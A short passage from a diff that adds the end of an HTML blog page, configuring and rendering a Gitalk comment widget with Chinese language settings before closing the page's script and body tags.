+      admin       : ['v5le0n9'],
+      id          : 'bf448fc3a2f8981954aa3c1739d9e4d2',
+        language: 'zh-CN',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+</body>
+</html>
